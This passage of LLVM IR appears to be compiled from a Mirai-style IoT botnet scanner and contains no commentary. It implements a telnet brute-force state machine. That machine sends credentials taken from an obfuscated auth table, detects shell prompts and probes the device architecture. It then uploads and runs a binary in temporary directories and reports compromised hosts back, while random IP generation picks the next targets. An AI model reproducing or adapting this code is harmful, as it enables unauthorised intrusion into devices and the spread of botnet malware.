  switch i32 %279, label %290 [
    i32 0, label %.thread265
    i32 -1, label %280
  ]

.thread265:                                       ; preds = %273
  store i32 104, i32* %95, align 4
  br label %282

; <label>:280:                                    ; preds = %273
  %.pr264 = load i32, i32* %95, align 4
  %281 = icmp eq i32 %.pr264, 11
  br i1 %281, label %.loopexit, label %282

; <label>:282:                                    ; preds = %.thread265, %280
  %283 = load i32, i32* %208, align 8
  %284 = call i32 @close(i32 %283) #9
  store i32 -1, i32* %208, align 8
  %285 = load i8, i8* %259, align 4
  %286 = add i8 %285, 1
  store i8 %286, i8* %259, align 4
  %287 = icmp ugt i8 %286, 9
  br i1 %287, label %288, label %289

; <label>:288:                                    ; preds = %282
  call void @fdclose(%struct.scanner_connection* nonnull %207, i32 undef)
  br label %.loopexit

; <label>:289:                                    ; preds = %282
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %207)
  br label %.loopexit

; <label>:290:                                    ; preds = %273
  %291 = load i32, i32* %254, align 8
  %292 = add nsw i32 %291, %279
  store i32 %292, i32* %254, align 8
  %293 = load i32, i32* @fake_time, align 4
  store i32 %293, i32* %257, align 4
  br label %294

; <label>:294:                                    ; preds = %.thread259, %290
  %295 = load i32, i32* %251, align 8
  switch i32 %295, label %.thread263.loopexit.loopexit [
    i32 2, label %296
    i32 3, label %300
    i32 4, label %309
    i32 5, label %318
    i32 6, label %337
    i32 7, label %361
    i32 8, label %368
    i32 9, label %375
    i32 10, label %429
    i32 12, label %441
    i32 11, label %461
    i32 13, label %496
  ]

; <label>:296:                                    ; preds = %294
  %297 = call fastcc i32 @consume_iacs(%struct.scanner_connection* nonnull %207)
  %298 = icmp sgt i32 %297, 0
  br i1 %298, label %299, label %514

; <label>:299:                                    ; preds = %296
  store i32 3, i32* %251, align 8
  br label %.thread259

; <label>:300:                                    ; preds = %294
  %301 = call fastcc i32 @consume_login_prompt(%struct.scanner_connection* nonnull %207, i32 1)
  %302 = icmp sgt i32 %301, 0
  br i1 %302, label %303, label %514

; <label>:303:                                    ; preds = %300
  %304 = load i32, i32* %208, align 8
  %305 = load %struct.scanner_auth*, %struct.scanner_auth** %258, align 8
  %306 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %305, i64 0, i32 0
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 (i32, i8*, ...) @fdsend(i32 %304, i8* %307)
  store i32 4, i32* %251, align 8
  br label %.thread259

; <label>:309:                                    ; preds = %294
  %310 = call fastcc i32 @consume_login_prompt(%struct.scanner_connection* nonnull %207, i32 0)
  %311 = icmp sgt i32 %310, 0
  br i1 %311, label %312, label %514

; <label>:312:                                    ; preds = %309
  %313 = load i32, i32* %208, align 8
  %314 = load %struct.scanner_auth*, %struct.scanner_auth** %258, align 8
  %315 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %314, i64 0, i32 1
  %316 = load i8*, i8** %315, align 8
  %317 = call i32 (i32, i8*, ...) @fdsend(i32 %313, i8* %316)
  store i32 5, i32* %251, align 8
  br label %.thread259

; <label>:318:                                    ; preds = %294
  %319 = call fastcc i32 @consume_shell_prompt(%struct.scanner_connection* nonnull %207)
  %320 = icmp sgt i32 %319, 0
  br i1 %320, label %321, label %327

; <label>:321:                                    ; preds = %318
  call void @table_unlock_val(i8 zeroext 11) #9
  %322 = load i32, i32* %208, align 8
  %323 = call i32 (i32, i8*, ...) @fdsend(i32 %322, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.105, i64 0, i64 0))
  %324 = load i32, i32* %208, align 8
  %325 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %326 = call i32 (i32, i8*, ...) @fdsend(i32 %324, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i64 0, i64 0), i8* %325)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 6, i32* %251, align 8
  br label %.thread259

; <label>:327:                                    ; preds = %318
  %328 = icmp eq i32 %319, -1
  br i1 %328, label %329, label %514

; <label>:329:                                    ; preds = %327
  %330 = load i32, i32* %208, align 8
  %331 = call i32 @close(i32 %330) #9
  store i32 -1, i32* %208, align 8
  %332 = load i8, i8* %259, align 4
  %333 = add i8 %332, 1
  store i8 %333, i8* %259, align 4
  %334 = icmp eq i8 %333, 10
  br i1 %334, label %335, label %336

; <label>:335:                                    ; preds = %329
  call void @fdclose(%struct.scanner_connection* nonnull %207, i32 undef)
  br label %.thread259

; <label>:336:                                    ; preds = %329
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %207)
  br label %.thread259

; <label>:337:                                    ; preds = %294
  %338 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %207)
  %339 = icmp sgt i32 %338, 0
  br i1 %339, label %340, label %514

; <label>:340:                                    ; preds = %337
  store i32 0, i32* %260, align 4
  %341 = load i32, i32* %261, align 8
  %342 = icmp eq i32 %341, 0
  br i1 %342, label %343, label %346

; <label>:343:                                    ; preds = %340
  %344 = load i32, i32* %208, align 8
  %345 = call i32 (i32, i8*, ...) @fdsend(i32 %344, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.107, i64 0, i64 0))
  br label %360

; <label>:346:                                    ; preds = %340
  %347 = call i32 @strcmp(i8* nonnull %262, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0)) #12
  %348 = icmp eq i32 %347, 0
  br i1 %348, label %352, label %349

; <label>:349:                                    ; preds = %346
  %350 = call i32 @strcmp(i8* %262, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i64 0, i64 0)) #12
  %351 = icmp eq i32 %350, 0
  br i1 %351, label %352, label %356

; <label>:352:                                    ; preds = %349, %346
  call void @table_unlock_val(i8 zeroext 11) #9
  %353 = load i32, i32* %208, align 8
  %354 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %355 = call i32 (i32, i8*, ...) @fdsend(i32 %353, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.110, i64 0, i64 0), i8* %354)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 8, i32* %251, align 8
  br label %.thread259

; <label>:356:                                    ; preds = %349
  call void @table_unlock_val(i8 zeroext 11) #9
  %357 = load i32, i32* %208, align 8
  %358 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %359 = call i32 (i32, i8*, ...) @fdsend(i32 %357, i8* %358)
  call void @table_lock_val(i8 zeroext 11) #9
  br label %360

; <label>:360:                                    ; preds = %356, %343
  %.sink = phi i32 [ 9, %356 ], [ 7, %343 ]
  store i32 %.sink, i32* %251, align 8
  br label %.thread259

; <label>:361:                                    ; preds = %294
  %362 = call fastcc i32 @parse_elf_response(%struct.scanner_connection* nonnull %207)
  %363 = icmp sgt i32 %362, 0
  br i1 %363, label %364, label %365

; <label>:364:                                    ; preds = %361
  store i32 1, i32* %261, align 8
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %207)
  br label %.thread259

; <label>:365:                                    ; preds = %361
  %366 = icmp eq i32 %362, -1
  br i1 %366, label %367, label %514

; <label>:367:                                    ; preds = %365
  store i8 0, i8* %259, align 4
  call void @fdclose(%struct.scanner_connection* %207, i32 undef)
  br label %.thread259

; <label>:368:                                    ; preds = %294
  %369 = call fastcc i32 @consume_arm_subtype(%struct.scanner_connection* nonnull %207)
  %370 = icmp sgt i32 %369, 0
  br i1 %370, label %371, label %514

; <label>:371:                                    ; preds = %368
  call void @table_unlock_val(i8 zeroext 11) #9
  %372 = load i32, i32* %208, align 8
  %373 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %374 = call i32 (i32, i8*, ...) @fdsend(i32 %372, i8* %373)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 9, i32* %251, align 8
  br label %.thread259

; <label>:375:                                    ; preds = %294
  %376 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %207)
  %377 = icmp sgt i32 %376, 0
  br i1 %377, label %.thread309, label %514

.thread309:                                       ; preds = %375
  %378 = load i32, i32* %263, align 4
  call fastcc void @report_working(i32 %378, %struct.scanner_connection* %207, i32 0)
  %379 = load i32, i32* %208, align 8
  %380 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 0), align 16
  %381 = call i32 (i32, i8*, ...) @fdsend(i32 %379, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %380, i8* %380)
  %382 = load i32, i32* %208, align 8
  %383 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 1), align 8
  %384 = call i32 (i32, i8*, ...) @fdsend(i32 %382, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %383, i8* %383)
  %385 = load i32, i32* %208, align 8
  %386 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 2), align 16
  %387 = call i32 (i32, i8*, ...) @fdsend(i32 %385, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %386, i8* %386)
  %388 = load i32, i32* %208, align 8
  %389 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 3), align 8
  %390 = call i32 (i32, i8*, ...) @fdsend(i32 %388, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %389, i8* %389)
  %391 = load i32, i32* %208, align 8
  %392 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 4), align 16
  %393 = call i32 (i32, i8*, ...) @fdsend(i32 %391, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %392, i8* %392)
  %394 = load i32, i32* %208, align 8
  %395 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 5), align 8
  %396 = call i32 (i32, i8*, ...) @fdsend(i32 %394, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %395, i8* %395)
  %397 = load i32, i32* %208, align 8
  %398 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 6), align 16
  %399 = call i32 (i32, i8*, ...) @fdsend(i32 %397, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %398, i8* %398)
  %400 = load i32, i32* %208, align 8
  %401 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 7), align 8
  %402 = call i32 (i32, i8*, ...) @fdsend(i32 %400, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %401, i8* %401)
  %403 = load i32, i32* %208, align 8
  %404 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 8), align 16
  %405 = call i32 (i32, i8*, ...) @fdsend(i32 %403, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %404, i8* %404)
  %406 = load i32, i32* %208, align 8
  %407 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 9), align 8
  %408 = call i32 (i32, i8*, ...) @fdsend(i32 %406, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %407, i8* %407)
  %409 = load i32, i32* %208, align 8
  %410 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 10), align 16
  %411 = call i32 (i32, i8*, ...) @fdsend(i32 %409, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %410, i8* %410)
  %412 = load i32, i32* %208, align 8
  %413 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 11), align 8
  %414 = call i32 (i32, i8*, ...) @fdsend(i32 %412, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %413, i8* %413)
  %415 = load i32, i32* %208, align 8
  %416 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 12), align 16
  %417 = call i32 (i32, i8*, ...) @fdsend(i32 %415, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %416, i8* %416)
  %418 = load i32, i32* %208, align 8
  %419 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 13), align 8
  %420 = call i32 (i32, i8*, ...) @fdsend(i32 %418, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %419, i8* %419)
  %421 = load i32, i32* %208, align 8
  %422 = load i8*, i8** getelementptr inbounds ([15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 14), align 16
  %423 = call i32 (i32, i8*, ...) @fdsend(i32 %421, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %422, i8* %422)
  %424 = load i32, i32* %208, align 8
  %425 = call i32 (i32, i8*, ...) @fdsend(i32 %424, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.112, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.114, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 11) #9
  %426 = load i32, i32* %208, align 8
  %427 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %428 = call i32 (i32, i8*, ...) @fdsend(i32 %426, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.115, i64 0, i64 0), i8* %427)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 10, i32* %251, align 8
  br label %.thread259

; <label>:429:                                    ; preds = %294
  %430 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %207)
  %431 = icmp sgt i32 %430, 0
  br i1 %431, label %432, label %514

; <label>:432:                                    ; preds = %429
  %433 = call i32 @strcmp(i8* %262, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i64 0, i64 0)) #12
  %434 = icmp eq i32 %433, 0
  call void @table_unlock_val(i8 zeroext 11) #9
  %435 = load i32, i32* %208, align 8
  %436 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  br i1 %434, label %437, label %439

; <label>:437:                                    ; preds = %432
  %438 = call i32 (i32, i8*, ...) @fdsend(i32 %435, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.117, i64 0, i64 0), i32 176, i32 107, i32 133, i32 208, i32 176, i32 107, i32 133, i32 208, i8* %436)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 3, i32* %264, align 4
  store i32 13, i32* %251, align 8
  br label %.thread259

; <label>:439:                                    ; preds = %432
  %440 = call i32 (i32, i8*, ...) @fdsend(i32 %435, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.118, i64 0, i64 0), i8* %436)
  call void @table_lock_val(i8 zeroext 11) #9
  store i32 12, i32* %251, align 8
  br label %.thread259

; <label>:441:                                    ; preds = %294
  %442 = call fastcc i32 @connection_consume_upload_methods(%struct.scanner_connection* nonnull %207)
  %443 = icmp eq i32 %442, 0
  br i1 %443, label %.thread263.loopexitthread-pre-split, label %444

; <label>:444:                                    ; preds = %441
  call void @table_unlock_val(i8 zeroext 11) #9
  %445 = load i32, i32* %264, align 4
  switch i32 %445, label %458 [
    i32 0, label %446
    i32 1, label %450
    i32 2, label %454
  ]

; <label>:446:                                    ; preds = %444
  %447 = load i32, i32* %208, align 8
  %448 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %449 = call i32 (i32, i8*, ...) @fdsend(i32 %447, i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.119, i64 0, i64 0), i8* %448)
  br label %458

; <label>:450:                                    ; preds = %444
  %451 = load i32, i32* %208, align 8
  %452 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %453 = call i32 (i32, i8*, ...) @fdsend(i32 %451, i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.120, i64 0, i64 0), i32 176, i32 107, i32 133, i32 208, i8* nonnull %262, i8* %452)
  br label %458

; <label>:454:                                    ; preds = %444
  %455 = load i32, i32* %208, align 8
  %456 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %457 = call i32 (i32, i8*, ...) @fdsend(i32 %455, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.121, i64 0, i64 0), i8* nonnull %262, i32 176, i32 107, i32 133, i32 208, i8* %456)
  br label %458

; <label>:458:                                    ; preds = %454, %450, %446, %444
  call void @table_lock_val(i8 zeroext 11) #9
  %459 = load i32, i32* %264, align 4
  %460 = icmp ne i32 %459, 0
  %.sink4 = select i1 %460, i32 13, i32 11
  store i32 %.sink4, i32* %251, align 8
  br label %.thread259

; <label>:461:                                    ; preds = %294
  %462 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %207)
  %463 = icmp sgt i32 %462, 0
  br i1 %463, label %464, label %514

; <label>:464:                                    ; preds = %461
  %465 = call fastcc %struct.payload* @get_retrieve_binary(%struct.scanner_connection* %207)
  %466 = icmp eq %struct.payload* %465, null
  br i1 %466, label %467, label %468

; <label>:467:                                    ; preds = %464
  call void @fdclose(%struct.scanner_connection* %207, i32 undef)
  br label %.thread259

; <label>:468:                                    ; preds = %464
  %469 = call fastcc %struct.binary* @process_retrieve_binary(%struct.payload* nonnull %465)
  %470 = icmp eq %struct.binary* %469, null
  br i1 %470, label %471, label %472

; <label>:471:                                    ; preds = %468
  call void @fdclose(%struct.scanner_connection* %207, i32 undef)
  br label %.thread259

; <label>:472:                                    ; preds = %468
  call void @table_unlock_val(i8 zeroext 11) #9
  %473 = load i32, i32* %208, align 8
  %474 = load i8, i8* %265, align 1
  %475 = zext i8 %474 to i64
  %476 = getelementptr inbounds %struct.binary, %struct.binary* %469, i64 %475, i32 0
  %477 = load i8*, i8** %476, align 8
  %478 = zext i8 %474 to i32
  %479 = icmp eq i8 %474, 0
  %480 = select i1 %479, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i64 0, i64 0)
  %481 = getelementptr inbounds %struct.binary, %struct.binary* %469, i64 0, i32 1
  %482 = load i8, i8* %481, align 8
  %483 = zext i8 %482 to i32
  %484 = add nsw i32 %483, -1
  %485 = icmp sge i32 %478, %484
  %486 = select i1 %485, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.125, i64 0, i64 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.126, i64 0, i64 0)
  %487 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %488 = call i32 (i32, i8*, ...) @fdsend(i32 %473, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.122, i64 0, i64 0), i8* %477, i8* %480, i8* %486, i8* %487)
  call void @table_lock_val(i8 zeroext 11) #9
  %489 = load i8, i8* %265, align 1
  %490 = icmp ult i8 %489, %482
  %491 = bitcast %struct.binary* %469 to i8*
  call void @free(i8* %491) #9
  br i1 %490, label %492, label %495

; <label>:492:                                    ; preds = %472
  %493 = load i8, i8* %265, align 1
  %494 = add i8 %493, 1
  store i8 %494, i8* %265, align 1
  store i32 11, i32* %251, align 8
  br label %.thread259

; <label>:495:                                    ; preds = %472
  store i32 13, i32* %251, align 8
  br label %.thread259

; <label>:496:                                    ; preds = %294
  %497 = call fastcc i32 @consume_method_resonse(%struct.scanner_connection* nonnull %207)
  %498 = icmp sgt i32 %497, 0
  br i1 %498, label %499, label %501

; <label>:499:                                    ; preds = %496
  %500 = load i32, i32* %263, align 4
  call fastcc void @report_working(i32 %500, %struct.scanner_connection* %207, i32 1)
  call void @fdclose(%struct.scanner_connection* %207, i32 undef)
  br label %.thread259

; <label>:501:                                    ; preds = %496
  switch i32 %497, label %514 [
    i32 -1, label %502
    i32 -2, label %513
  ]

; <label>:502:                                    ; preds = %501
  %503 = load i32, i32* %251, align 8
  %504 = icmp eq i32 %503, 11
  br i1 %504, label %508, label %505

; <label>:505:                                    ; preds = %502
  %506 = load i32, i32* %264, align 4
  %507 = icmp eq i32 %506, 0
  br i1 %507, label %508, label %509

; <label>:508:                                    ; preds = %505, %502
  call void @fdclose(%struct.scanner_connection* nonnull %207, i32 undef)
  br label %.thread259

; <label>:509:                                    ; preds = %505
  store i32 0, i32* %264, align 4
  store i32 11, i32* %251, align 8
  call void @table_unlock_val(i8 zeroext 11) #9
  %510 = load i32, i32* %208, align 8
  %511 = call i8* @table_retrieve_val(i32 11, i32* null) #9
  %512 = call i32 (i32, i8*, ...) @fdsend(i32 %510, i8* %511)
  call void @table_lock_val(i8 zeroext 11) #9
  br label %.thread259

; <label>:513:                                    ; preds = %501
  call void @fdclose(%struct.scanner_connection* %207, i32 undef)
  br label %.thread259

; <label>:514:                                    ; preds = %501, %461, %429, %375, %368, %365, %337, %327, %309, %300, %296
  %.0236 = phi i32 [ %462, %461 ], [ %430, %429 ], [ %376, %375 ], [ %369, %368 ], [ %362, %365 ], [ %338, %337 ], [ %319, %327 ], [ %310, %309 ], [ %301, %300 ], [ %297, %296 ], [ %497, %501 ]
  %515 = icmp eq i32 %.0236, 0
  br i1 %515, label %.thread263.loopexitthread-pre-split, label %.thread259

.thread259:                                       ; preds = %.thread309, %299, %303, %312, %336, %335, %321, %352, %360, %367, %364, %371, %439, %437, %458, %467, %471, %495, %492, %513, %509, %508, %499, %514
  %.0236260 = phi i32 [ %.0236, %514 ], [ %297, %299 ], [ %301, %303 ], [ %310, %312 ], [ -1, %336 ], [ -1, %335 ], [ %319, %321 ], [ %338, %352 ], [ %338, %360 ], [ -1, %367 ], [ %362, %364 ], [ %369, %371 ], [ %430, %439 ], [ %430, %437 ], [ %442, %458 ], [ %462, %467 ], [ %462, %471 ], [ %462, %495 ], [ %462, %492 ], [ -2, %513 ], [ -1, %509 ], [ -1, %508 ], [ %497, %499 ], [ %376, %.thread309 ]
  %516 = load i32, i32* %254, align 8
  %517 = icmp sgt i32 %.0236260, %516
  %..0236 = select i1 %517, i32 %516, i32 %.0236260
  %518 = sub nsw i32 %516, %..0236
  store i32 %518, i32* %254, align 8
  %519 = sext i32 %..0236 to i64
  %520 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 7, i64 %519
  %521 = sext i32 %518 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %255, i8* %520, i64 %521, i32 1, i1 false)
  %522 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %206, i32 7, i64 %521
  store i8 0, i8* %522, align 1
  br label %294

.loopexit.loopexit:                               ; preds = %.thread263.loopexit
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.thread263.preheader, %280, %240, %289, %288, %205, %225
  %523 = load i32, i32* %1, align 4
  %524 = add nsw i32 %523, 1
  store i32 %524, i32* %1, align 4
  %525 = icmp slt i32 %524, 628
  br i1 %525, label %205, label %.loopexit266.loopexit
}

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_auth_entry(i8*, i8*, i16 zeroext) unnamed_addr #3 {
  %4 = alloca i32, align 4
  %5 = load i8*, i8** bitcast (%struct.scanner_auth** @auth_table to i8**), align 8
  %6 = load i32, i32* @auth_table_len, align 4
  %7 = add nsw i32 %6, 1
  %8 = sext i32 %7 to i64
  %9 = mul nsw i64 %8, 24
  %10 = tail call i8* @realloc(i8* %5, i64 %9) #9
  store i8* %10, i8** bitcast (%struct.scanner_auth** @auth_table to i8**), align 8
  %11 = call fastcc i8* @deobf(i8* %0, i32* nonnull %4)
  %12 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %13 = load i32, i32* @auth_table_len, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %12, i64 %14, i32 0
  store i8* %11, i8** %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %14, i32 4
  store i8 %17, i8* %19, align 4
  %20 = call fastcc i8* @deobf(i8* %1, i32* nonnull %4)
  %21 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %22 = load i32, i32* @auth_table_len, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 1
  store i8* %20, i8** %24, align 8
  %25 = load i32, i32* %4, align 4
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 5
  store i8 %26, i8* %27, align 1
  %28 = load i16, i16* @auth_table_max_weight, align 2
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 2
  store i16 %28, i16* %29, align 8
  %30 = add i16 %28, %2
  %31 = add nsw i32 %22, 1
  store i32 %31, i32* @auth_table_len, align 4
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 3
  store i16 %30, i16* %32, align 2
  store i16 %30, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_random_ip() unnamed_addr #3 {
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %1 = tail call i32 @rand_next() #9
  %2 = urem i32 %1, 255
  %3 = tail call i32 @rand_next() #9
  %4 = tail call i32 @rand_next() #9
  %5 = tail call i32 @rand_next() #9
  %trunc = trunc i32 %2 to i8
  switch i8 %trunc, label %6 [
    i8 0, label %.critedge.backedge
    i8 127, label %.critedge.backedge
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge
  br label %.critedge

; <label>:6:                                      ; preds = %.critedge
  %7 = urem i32 %3, 255
  %8 = urem i32 %4, 255
  %9 = urem i32 %5, 255
  %10 = tail call i32 @rand_next() #9
  %11 = urem i32 %10, 35
  %trunc50 = trunc i32 %11 to i6
  switch i6 %trunc50, label %38 [
    i6 0, label %12
    i6 1, label %17
    i6 2, label %20
    i6 3, label %23
    i6 4, label %28
    i6 5, label %33
  ]

; <label>:12:                                     ; preds = %6
  %13 = shl nuw nsw i32 %7, 16
  %14 = shl nuw nsw i32 %8, 8
  %15 = or i32 %14, %13
  %16 = or i32 %15, %9
  br label %58

; <label>:17:                                     ; preds = %6
  %18 = shl nuw nsw i32 %8, 8
  %19 = or i32 %18, %9
  br label %58

; <label>:20:                                     ; preds = %6
  %21 = shl nuw nsw i32 %8, 8
  %22 = or i32 %21, %9
  br label %58

; <label>:23:                                     ; preds = %6
  %24 = shl nuw nsw i32 %7, 16
  %25 = shl nuw nsw i32 %8, 8
  %26 = or i32 %25, %24
  %27 = or i32 %26, %9
  br label %58

; <label>:28:                                     ; preds = %6
  %29 = shl nuw nsw i32 %7, 16
  %30 = shl nuw nsw i32 %8, 8
  %31 = or i32 %30, %29
  %32 = or i32 %31, %9
  br label %58

; <label>:33:                                     ; preds = %6
  %34 = shl nuw nsw i32 %7, 16
  %35 = shl nuw nsw i32 %8, 8
  %36 = or i32 %35, %34
  %37 = or i32 %36, %9
  br label %58

; <label>:38:                                     ; preds = %6
  %39 = or i32 %11, 1
  %trunc51 = trunc i32 %39 to i6
  switch i6 %trunc51, label %52 [
    i6 7, label %40
    i6 11, label %43
    i6 13, label %46
    i6 9, label %49
  ]

; <label>:40:                                     ; preds = %38
  %41 = shl nuw nsw i32 %8, 8
  %42 = or i32 %41, %9
  br label %58

; <label>:43:                                     ; preds = %38
  %44 = shl nuw nsw i32 %8, 8
  %45 = or i32 %44, %9
  br label %58

; <label>:46:                                     ; preds = %38
  %47 = shl nuw nsw i32 %8, 8
  %48 = or i32 %47, %9
  br label %58

; <label>:49:                                     ; preds = %38
  %50 = shl nuw nsw i32 %8, 8
  %51 = or i32 %50, %9
  br label %58

; <label>:52:                                     ; preds = %38
  %53 = shl nuw i32 %2, 24
  %54 = shl nuw nsw i32 %7, 16
  %55 = or i32 %54, %53
  %56 = shl nuw nsw i32 %8, 8
  %57 = or i32 %55, %56
  br label %58

; <label>:58:                                     ; preds = %52, %49, %46, %43, %40, %33, %28, %23, %20, %17, %12
  %.sink49 = phi i32 [ %9, %52 ], [ 453443584, %49 ], [ -875298816, %46 ], [ 1935802368, %43 ], [ 1022558208, %40 ], [ -1325400064, %33 ], [ -1174405120, %28 ], [ 1946157056, %23 ], [ 2006843392, %20 ], [ 2006777856, %17 ], [ 1996488704, %12 ]
  %.sink48 = phi i32 [ %57, %52 ], [ %51, %49 ], [ %48, %46 ], [ %45, %43 ], [ %42, %40 ], [ %37, %33 ], [ %32, %28 ], [ %27, %23 ], [ %22, %20 ], [ %19, %17 ], [ %16, %12 ]
  %59 = or i32 %.sink48, %.sink49
  %60 = tail call i32 @htonl(i32 %59) #11
  ret i32 %60
}

declare zeroext i16 @checksum_generic(i16*, i32) local_unnamed_addr #2

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) local_unnamed_addr #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #2

